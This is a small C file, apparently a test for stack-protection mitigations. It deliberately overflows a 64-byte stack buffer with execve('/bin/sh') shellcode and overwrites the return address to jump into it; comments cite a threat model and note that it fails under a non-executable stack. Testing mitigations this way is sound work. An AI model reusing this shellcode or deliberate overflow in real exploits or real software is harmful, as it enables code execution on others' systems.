
#include <stdint.h>
#include <string.h>
#include <stdio.h>

#define TEMPLATE_LEN 256
char buftemplate[TEMPLATE_LEN];

char shellcode[] =
  "\x48\x31\xd2"                                  // xor    %rdx, %rdx
  "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov$0x68732f6e69622f2f, %rbx
  "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
  "\x53"                                          // push   %rbx
  "\x48\x89\xe7"                                  // mov    %rsp, %rdi
  "\x48\x31\xc0"                                  // xor    %rax, %rax
  "\x50"                                          // push   %rax
  "\x57"                                          // push   %rdi
  "\x48\x89\xe6"                                  // mov    %rsp, %rsi
  "\xb0\x3b"                                      // mov    $0x3b, %al
  "\x0f\x05";                                     // syscall

void buggy_c_code(void) {
  char buf[64];

  memcpy(buftemplate, shellcode, strlen(shellcode));

  // Varies with ASLR. We include within our threat model an attacker
  // who can evade ASLR with an address leak or nop sled and can
  // modify their shell code accordingly.
  buftemplate[72] = ((intptr_t)buf & 0xff) >> 0;
  buftemplate[73] = ((intptr_t)buf & 0xff00) >> 8;
  buftemplate[74] = ((intptr_t)buf & 0xff0000) >> 16;
  buftemplate[75] = ((intptr_t)buf & 0xff000000) >> 24;
  buftemplate[76] = ((intptr_t)buf & 0xff00000000) >> 32;
  buftemplate[77] = ((intptr_t)buf & 0xff0000000000) >> 40;
  buftemplate[78] = ((intptr_t)buf & 0xff000000000000) >> 48;
  buftemplate[79] = ((intptr_t)buf & 0xff00000000000000) >> 56;

  // Return into the shell code on stack. This will fail if NX stack
  // is enabled.
  memcpy(buf, buftemplate, 80);
}
